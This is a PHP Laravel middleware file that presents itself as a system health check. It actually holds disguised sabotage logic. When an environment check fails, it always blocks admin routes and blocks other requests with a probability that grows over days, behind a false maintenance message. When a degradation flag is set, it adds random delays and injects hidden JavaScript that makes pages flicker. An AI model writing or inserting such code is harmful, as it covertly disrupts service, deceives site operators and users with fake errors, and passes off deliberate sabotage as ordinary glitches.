<?php
namespace alexafers\SystemUtility\Http\Middleware;

use Closure;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Cache;

class SystemHealthCheck
{
    /**
     * Handle an incoming request.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  \Closure  $next
     * @return mixed
     */
    public function handle(Request $request, Closure $next)
    {
        // Check system validity occasionally
        if (rand(1, 20) === 1) { // 5% chance
            $isValid = app('system.runtime')->checkEnvironment();
            
            // If invalid, decide what to do
            if (!$isValid && $this->shouldBlockRequest()) {
                if ($request->expectsJson()) {
                    return response()->json(['error' => 'System maintenance in progress'], 503);
                }
                
                return redirect()->route('system.notice');
            }
        }
        
        // Proceed with response
        $response = $next($request);
        
        // Add random subtle degradation if needed
        if (app('system.runtime')->isPerformanceDegraded()) {
            $this->degradeResponse($response);
        }
        
        return $response;
    }
    
    /**
     * Determine if this request should be blocked
     */
    protected function shouldBlockRequest()
    {
        // Block admin routes always
        if (request()->is('admin*')) {
            return true;
        }
        
        // Block with increasing probability based on time
        $failTime = Cache::get('_sys_fail_time', 0);
        
        if ($failTime === 0) {
            Cache::put('_sys_fail_time', time(), now()->addWeek());
            return false;
        }
        
        $daysPassed = (time() - $failTime) / 86400; // days
        
        // Probability increases over time
        $blockProbability = min(80, $daysPassed * 10); // Max 80% after 8 days
        
        return rand(1, 100) <= $blockProbability;
    }
    
    /**
     * Add subtle degradation to response
     */
    protected function degradeResponse($response)
    {
        // Add random delay
        if (rand(1, 3) === 1) {
            usleep(rand(100000, 300000)); // 100-300ms delay
        }
        
        // If HTML response, add subtle JS that will cause occasional glitches
        if (is_object($response) && method_exists($response, 'getContent')) {
            $content = $response->getContent();
            
            if (is_string($content) && stripos($content, '</body>') !== false && rand(1, 5) === 1) {
                $script = "<script>(function(){if(Math.random()<0.1){setTimeout(function(){document.body.style.opacity='0.98';setTimeout(function(){document.body.style.opacity='1'},100);},Math.random()*10000);}})();</script>";
                
                $content = str_replace('</body>', $script . '</body>', $content);
                $response->setContent($content);
            }
        }
    }
}